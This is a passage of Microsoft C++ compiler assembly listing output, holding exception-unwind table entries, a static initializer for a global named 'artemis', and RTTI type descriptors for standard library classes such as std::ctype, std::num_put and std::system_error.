	DD	imagerel $unwind$??$_Copy_memmove@PEA_WPEA_W@std@@YAPEA_WPEA_W00@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+45
	DD	imagerel $unwind$??1?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Emplace_back@_W@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAX$$QEA_W@Z DD imagerel $LN3
	DD	imagerel $LN3+95
	DD	imagerel $unwind$??$_Emplace_back@_W@?$_Uninitialized_backout_al@V?$allocator@_W@std@@@std@@QEAAX$$QEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Copy_memmove@PEAEPEAE@std@@YAPEAEPEAE00@Z DD imagerel $LN3
	DD	imagerel $LN3+159
	DD	imagerel $unwind$??$_Copy_memmove@PEAEPEAE@std@@YAPEAEPEAE00@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+45
	DD	imagerel $unwind$??1?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Emplace_back@E@?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAAX$$QEAE@Z DD imagerel $LN3
	DD	imagerel $LN3+94
	DD	imagerel $unwind$??$_Emplace_back@E@?$_Uninitialized_backout_al@V?$allocator@E@std@@@std@@QEAAX$$QEAE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Copy_memmove@PEADPEAD@std@@YAPEADPEAD00@Z DD imagerel $LN3
	DD	imagerel $LN3+159
	DD	imagerel $unwind$??$_Copy_memmove@PEADPEAD@std@@YAPEADPEAD00@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+45
	DD	imagerel $unwind$??1?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Emplace_back@D@?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAAX$$QEAD@Z DD imagerel $LN3
	DD	imagerel $LN3+94
	DD	imagerel $unwind$??$_Emplace_back@D@?$_Uninitialized_backout_al@V?$allocator@D@std@@@std@@QEAAX$$QEAD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$construct@_W_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_W$$QEA_W@Z DD imagerel $LN3
	DD	imagerel $LN3+73
	DD	imagerel $unwind$??$construct@_W_W@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SAXAEAV?$allocator@_W@1@QEA_W$$QEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$construct@EE@?$_Default_allocator_traits@V?$allocator@E@std@@@std@@SAXAEAV?$allocator@E@1@QEAE$$QEAE@Z DD imagerel $LN3
	DD	imagerel $LN3+72
	DD	imagerel $unwind$??$construct@EE@?$_Default_allocator_traits@V?$allocator@E@std@@@std@@SAXAEAV?$allocator@E@1@QEAE$$QEAE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$construct@DD@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SAXAEAV?$allocator@D@1@QEAD$$QEAD@Z DD imagerel $LN3
	DD	imagerel $LN3+72
	DD	imagerel $unwind$??$construct@DD@?$_Default_allocator_traits@V?$allocator@D@std@@@std@@SAXAEAV?$allocator@D@1@QEAD$$QEAD@Z
pdata	ENDS
CRT$XCU	SEGMENT
?artemis$initializer$@@3P6AXXZEA DQ FLAT:??__Eartemis@@YAXXZ ; artemis$initializer$
CRT$XCU	ENDS
;	COMDAT __real@4202a05f20000000
CONST	SEGMENT
__real@4202a05f20000000 DQ 04202a05f20000000r	; 1e+10
CONST	ENDS
;	COMDAT ??_R1A@?0A@EA@?$numpunct@D@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@?$numpunct@D@std@@8 DD imagerel ??_R0?AV?$numpunct@D@std@@@8 ; std::numpunct<char>::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	03H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3?$numpunct@D@std@@8
rdata$r	ENDS
;	COMDAT ??_R2?$numpunct@D@std@@8
rdata$r	SEGMENT
??_R2?$numpunct@D@std@@8 DD imagerel ??_R1A@?0A@EA@?$numpunct@D@std@@8 ; std::numpunct<char>::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@facet@locale@std@@8
	DD	imagerel ??_R1A@?0A@EA@_Facet_base@std@@8
	DD	imagerel ??_R17?0A@EA@_Crt_new_delete@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3?$numpunct@D@std@@8
rdata$r	SEGMENT
??_R3?$numpunct@D@std@@8 DD 00H				; std::numpunct<char>::`RTTI Class Hierarchy Descriptor'
	DD	01H
	DD	04H
	DD	imagerel ??_R2?$numpunct@D@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV?$numpunct@D@std@@@8
data$rs	SEGMENT
??_R0?AV?$numpunct@D@std@@@8 DQ FLAT:??_7type_info@@6B@	; std::numpunct<char> `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AV?$numpunct@D@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4?$numpunct@D@std@@6B@
rdata$r	SEGMENT
??_R4?$numpunct@D@std@@6B@ DD 01H			; std::numpunct<char>::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AV?$numpunct@D@std@@@8
	DD	imagerel ??_R3?$numpunct@D@std@@8
	DD	imagerel ??_R4?$numpunct@D@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@8 DD imagerel ??_R0?AV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@8 ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	03H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R2?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@8
rdata$r	SEGMENT
??_R2?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@8 DD imagerel ??_R1A@?0A@EA@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@8 ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@facet@locale@std@@8
	DD	imagerel ??_R1A@?0A@EA@_Facet_base@std@@8
	DD	imagerel ??_R17?0A@EA@_Crt_new_delete@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@8
rdata$r	SEGMENT
??_R3?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@8 DD 00H ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::`RTTI Class Hierarchy Descriptor'
	DD	01H
	DD	04H
	DD	imagerel ??_R2?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@8
data$rs	SEGMENT
??_R0?AV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@8 DQ FLAT:??_7type_info@@6B@ ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > > `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@'
	DB	'std@@@std@@@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@6B@
rdata$r	SEGMENT
??_R4?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@6B@ DD 01H ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@8
	DD	imagerel ??_R3?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@8
	DD	imagerel ??_R4?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@failure@ios_base@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@failure@ios_base@std@@8 DD imagerel ??_R0?AVfailure@ios_base@std@@@8 ; std::ios_base::failure::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	04H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3failure@ios_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R2failure@ios_base@std@@8
rdata$r	SEGMENT
??_R2failure@ios_base@std@@8 DD imagerel ??_R1A@?0A@EA@failure@ios_base@std@@8 ; std::ios_base::failure::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@system_error@std@@8
	DD	imagerel ??_R1A@?0A@EA@_System_error@std@@8
	DD	imagerel ??_R1A@?0A@EA@runtime_error@std@@8
	DD	imagerel ??_R1A@?0A@EA@exception@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3failure@ios_base@std@@8
rdata$r	SEGMENT
??_R3failure@ios_base@std@@8 DD 00H			; std::ios_base::failure::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	05H
	DD	imagerel ??_R2failure@ios_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R4failure@ios_base@std@@6B@
rdata$r	SEGMENT
??_R4failure@ios_base@std@@6B@ DD 01H			; std::ios_base::failure::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVfailure@ios_base@std@@@8
	DD	imagerel ??_R3failure@ios_base@std@@8
	DD	imagerel ??_R4failure@ios_base@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@?$ctype@_W@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@?$ctype@_W@std@@8 DD imagerel ??_R0?AV?$ctype@_W@std@@@8 ; std::ctype<wchar_t>::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	04H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3?$ctype@_W@std@@8
rdata$r	ENDS
;	COMDAT ??_R2?$ctype@_W@std@@8
rdata$r	SEGMENT
??_R2?$ctype@_W@std@@8 DD imagerel ??_R1A@?0A@EA@?$ctype@_W@std@@8 ; std::ctype<wchar_t>::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@ctype_base@std@@8
	DD	imagerel ??_R1A@?0A@EA@facet@locale@std@@8
	DD	imagerel ??_R1A@?0A@EA@_Facet_base@std@@8
	DD	imagerel ??_R17?0A@EA@_Crt_new_delete@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3?$ctype@_W@std@@8
rdata$r	SEGMENT
??_R3?$ctype@_W@std@@8 DD 00H				; std::ctype<wchar_t>::`RTTI Class Hierarchy Descriptor'
	DD	01H
	DD	05H
	DD	imagerel ??_R2?$ctype@_W@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV?$ctype@_W@std@@@8
data$rs	SEGMENT
??_R0?AV?$ctype@_W@std@@@8 DQ FLAT:??_7type_info@@6B@	; std::ctype<wchar_t> `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AV?$ctype@_W@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4?$ctype@_W@std@@6B@
rdata$r	SEGMENT
??_R4?$ctype@_W@std@@6B@ DD 01H				; std::ctype<wchar_t>::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AV?$ctype@_W@std@@@8
	DD	imagerel ??_R3?$ctype@_W@std@@8
	DD	imagerel ??_R4?$ctype@_W@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@?$ctype@D@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@?$ctype@D@std@@8 DD imagerel ??_R0?AV?$ctype@D@std@@@8 ; std::ctype<char>::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	04H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3?$ctype@D@std@@8
rdata$r	ENDS
;	COMDAT ??_R2?$ctype@D@std@@8
rdata$r	SEGMENT
??_R2?$ctype@D@std@@8 DD imagerel ??_R1A@?0A@EA@?$ctype@D@std@@8 ; std::ctype<char>::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@ctype_base@std@@8
	DD	imagerel ??_R1A@?0A@EA@facet@locale@std@@8
	DD	imagerel ??_R1A@?0A@EA@_Facet_base@std@@8
	DD	imagerel ??_R17?0A@EA@_Crt_new_delete@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3?$ctype@D@std@@8
rdata$r	SEGMENT
??_R3?$ctype@D@std@@8 DD 00H				; std::ctype<char>::`RTTI Class Hierarchy Descriptor'
	DD	01H
	DD	05H
	DD	imagerel ??_R2?$ctype@D@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV?$ctype@D@std@@@8
data$rs	SEGMENT
??_R0?AV?$ctype@D@std@@@8 DQ FLAT:??_7type_info@@6B@	; std::ctype<char> `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AV?$ctype@D@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4?$ctype@D@std@@6B@
rdata$r	SEGMENT
??_R4?$ctype@D@std@@6B@ DD 01H				; std::ctype<char>::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AV?$ctype@D@std@@@8
	DD	imagerel ??_R3?$ctype@D@std@@8
	DD	imagerel ??_R4?$ctype@D@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@ctype_base@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@ctype_base@std@@8 DD imagerel ??_R0?AUctype_base@std@@@8 ; std::ctype_base::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	03H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3ctype_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R2ctype_base@std@@8
rdata$r	SEGMENT
??_R2ctype_base@std@@8 DD imagerel ??_R1A@?0A@EA@ctype_base@std@@8 ; std::ctype_base::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@facet@locale@std@@8
	DD	imagerel ??_R1A@?0A@EA@_Facet_base@std@@8
	DD	imagerel ??_R17?0A@EA@_Crt_new_delete@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3ctype_base@std@@8
rdata$r	SEGMENT
??_R3ctype_base@std@@8 DD 00H				; std::ctype_base::`RTTI Class Hierarchy Descriptor'
	DD	01H
	DD	04H
	DD	imagerel ??_R2ctype_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AUctype_base@std@@@8
data$rs	SEGMENT
??_R0?AUctype_base@std@@@8 DQ FLAT:??_7type_info@@6B@	; std::ctype_base `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AUctype_base@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4ctype_base@std@@6B@
rdata$r	SEGMENT
??_R4ctype_base@std@@6B@ DD 01H				; std::ctype_base::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AUctype_base@std@@@8
	DD	imagerel ??_R3ctype_base@std@@8
	DD	imagerel ??_R4ctype_base@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R4facet@locale@std@@6B@
rdata$r	SEGMENT
??_R4facet@locale@std@@6B@ DD 01H			; std::locale::facet::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVfacet@locale@std@@@8
	DD	imagerel ??_R3facet@locale@std@@8
	DD	imagerel ??_R4facet@locale@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@_Crt_new_delete@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@_Crt_new_delete@std@@8 DD imagerel ??_R0?AU_Crt_new_delete@std@@@8 ; std::_Crt_new_delete::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	00H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3_Crt_new_delete@std@@8
rdata$r	ENDS
;	COMDAT ??_R2_Crt_new_delete@std@@8
rdata$r	SEGMENT
??_R2_Crt_new_delete@std@@8 DD imagerel ??_R1A@?0A@EA@_Crt_new_delete@std@@8 ; std::_Crt_new_delete::`RTTI Base Class Array'
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3_Crt_new_delete@std@@8
rdata$r	SEGMENT
??_R3_Crt_new_delete@std@@8 DD 00H			; std::_Crt_new_delete::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	01H
	DD	imagerel ??_R2_Crt_new_delete@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AU_Crt_new_delete@std@@@8
data$rs	SEGMENT
??_R0?AU_Crt_new_delete@std@@@8 DQ FLAT:??_7type_info@@6B@ ; std::_Crt_new_delete `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AU_Crt_new_delete@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R17?0A@EA@_Crt_new_delete@std@@8
rdata$r	SEGMENT
??_R17?0A@EA@_Crt_new_delete@std@@8 DD imagerel ??_R0?AU_Crt_new_delete@std@@@8 ; std::_Crt_new_delete::`RTTI Base Class Descriptor at (8,-1,0,64)'
	DD	00H
	DD	08H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3_Crt_new_delete@std@@8
rdata$r	ENDS
;	COMDAT ??_R2facet@locale@std@@8
rdata$r	SEGMENT
??_R2facet@locale@std@@8 DD imagerel ??_R1A@?0A@EA@facet@locale@std@@8 ; std::locale::facet::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@_Facet_base@std@@8
	DD	imagerel ??_R17?0A@EA@_Crt_new_delete@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3facet@locale@std@@8
rdata$r	SEGMENT
??_R3facet@locale@std@@8 DD 00H				; std::locale::facet::`RTTI Class Hierarchy Descriptor'
	DD	01H
	DD	03H
	DD	imagerel ??_R2facet@locale@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AVfacet@locale@std@@@8
data$rs	SEGMENT
??_R0?AVfacet@locale@std@@@8 DQ FLAT:??_7type_info@@6B@	; std::locale::facet `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVfacet@locale@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R1A@?0A@EA@facet@locale@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@facet@locale@std@@8 DD imagerel ??_R0?AVfacet@locale@std@@@8 ; std::locale::facet::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	02H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3facet@locale@std@@8
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@_Facet_base@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@_Facet_base@std@@8 DD imagerel ??_R0?AV_Facet_base@std@@@8 ; std::_Facet_base::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	00H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3_Facet_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R2_Facet_base@std@@8
rdata$r	SEGMENT
??_R2_Facet_base@std@@8 DD imagerel ??_R1A@?0A@EA@_Facet_base@std@@8 ; std::_Facet_base::`RTTI Base Class Array'
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3_Facet_base@std@@8
rdata$r	SEGMENT
??_R3_Facet_base@std@@8 DD 00H				; std::_Facet_base::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	01H
	DD	imagerel ??_R2_Facet_base@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV_Facet_base@std@@@8
data$rs	SEGMENT
??_R0?AV_Facet_base@std@@@8 DQ FLAT:??_7type_info@@6B@	; std::_Facet_base `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AV_Facet_base@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4_Facet_base@std@@6B@
rdata$r	SEGMENT
??_R4_Facet_base@std@@6B@ DD 01H			; std::_Facet_base::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AV_Facet_base@std@@@8
	DD	imagerel ??_R3_Facet_base@std@@8
	DD	imagerel ??_R4_Facet_base@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@bad_cast@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@bad_cast@std@@8 DD imagerel ??_R0?AVbad_cast@std@@@8 ; std::bad_cast::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	01H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3bad_cast@std@@8
rdata$r	ENDS
;	COMDAT ??_R2bad_cast@std@@8
rdata$r	SEGMENT
??_R2bad_cast@std@@8 DD imagerel ??_R1A@?0A@EA@bad_cast@std@@8 ; std::bad_cast::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@exception@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3bad_cast@std@@8
rdata$r	SEGMENT
??_R3bad_cast@std@@8 DD 00H				; std::bad_cast::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	02H
	DD	imagerel ??_R2bad_cast@std@@8
rdata$r	ENDS
;	COMDAT ??_R4bad_cast@std@@6B@
rdata$r	SEGMENT
??_R4bad_cast@std@@6B@ DD 01H				; std::bad_cast::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVbad_cast@std@@@8
	DD	imagerel ??_R3bad_cast@std@@8
	DD	imagerel ??_R4bad_cast@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@_Iostream_error_category2@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@_Iostream_error_category2@std@@8 DD imagerel ??_R0?AV_Iostream_error_category2@std@@@8 ; std::_Iostream_error_category2::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	01H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3_Iostream_error_category2@std@@8
rdata$r	ENDS
;	COMDAT ??_R2_Iostream_error_category2@std@@8
rdata$r	SEGMENT
??_R2_Iostream_error_category2@std@@8 DD imagerel ??_R1A@?0A@EA@_Iostream_error_category2@std@@8 ; std::_Iostream_error_category2::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@error_category@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3_Iostream_error_category2@std@@8
rdata$r	SEGMENT
??_R3_Iostream_error_category2@std@@8 DD 00H		; std::_Iostream_error_category2::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	02H
	DD	imagerel ??_R2_Iostream_error_category2@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AV_Iostream_error_category2@std@@@8
data$rs	SEGMENT
??_R0?AV_Iostream_error_category2@std@@@8 DQ FLAT:??_7type_info@@6B@ ; std::_Iostream_error_category2 `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AV_Iostream_error_category2@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R4_Iostream_error_category2@std@@6B@
rdata$r	SEGMENT
??_R4_Iostream_error_category2@std@@6B@ DD 01H		; std::_Iostream_error_category2::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AV_Iostream_error_category2@std@@@8
	DD	imagerel ??_R3_Iostream_error_category2@std@@8
	DD	imagerel ??_R4_Iostream_error_category2@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@system_error@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@system_error@std@@8 DD imagerel ??_R0?AVsystem_error@std@@@8 ; std::system_error::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	03H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3system_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R2system_error@std@@8
rdata$r	SEGMENT
??_R2system_error@std@@8 DD imagerel ??_R1A@?0A@EA@system_error@std@@8 ; std::system_error::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@_System_error@std@@8
	DD	imagerel ??_R1A@?0A@EA@runtime_error@std@@8
	DD	imagerel ??_R1A@?0A@EA@exception@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3system_error@std@@8
rdata$r	SEGMENT
??_R3system_error@std@@8 DD 00H				; std::system_error::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	04H
	DD	imagerel ??_R2system_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R4system_error@std@@6B@
rdata$r	SEGMENT
??_R4system_error@std@@6B@ DD 01H			; std::system_error::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVsystem_error@std@@@8
	DD	imagerel ??_R3system_error@std@@8
	DD	imagerel ??_R4system_error@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@_System_error@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@_System_error@std@@8 DD imagerel ??_R0?AV_System_error@std@@@8 ; std::_System_error::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	02H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3_System_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R2_System_error@std@@8
rdata$r	SEGMENT
??_R2_System_error@std@@8 DD imagerel ??_R1A@?0A@EA@_System_error@std@@8 ; std::_System_error::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@runtime_error@std@@8
	DD	imagerel ??_R1A@?0A@EA@exception@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3_System_error@std@@8
rdata$r	SEGMENT
??_R3_System_error@std@@8 DD 00H			; std::_System_error::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	03H
	DD	imagerel ??_R2_System_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R4_System_error@std@@6B@
rdata$r	SEGMENT
??_R4_System_error@std@@6B@ DD 01H			; std::_System_error::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AV_System_error@std@@@8
	DD	imagerel ??_R3_System_error@std@@8
	DD	imagerel ??_R4_System_error@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@error_category@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@error_category@std@@8 DD imagerel ??_R0?AVerror_category@std@@@8 ; std::error_category::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	00H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3error_category@std@@8
rdata$r	ENDS
;	COMDAT ??_R2error_category@std@@8
rdata$r	SEGMENT
??_R2error_category@std@@8 DD imagerel ??_R1A@?0A@EA@error_category@std@@8 ; std::error_category::`RTTI Base Class Array'
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3error_category@std@@8
rdata$r	SEGMENT
??_R3error_category@std@@8 DD 00H			; std::error_category::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	01H
	DD	imagerel ??_R2error_category@std@@8
rdata$r	ENDS
;	COMDAT ??_R0?AVerror_category@std@@@8
data$rs	SEGMENT
??_R0?AVerror_category@std@@@8 DQ FLAT:??_7type_info@@6B@ ; std::error_category `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVerror_category@std@@', 00H
data$rs	ENDS
;	COMDAT ??_R1A@?0A@EA@runtime_error@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@runtime_error@std@@8 DD imagerel ??_R0?AVruntime_error@std@@@8 ; std::runtime_error::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	01H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3runtime_error@std@@8
rdata$r	ENDS
;	COMDAT ??_R2runtime_error@std@@8
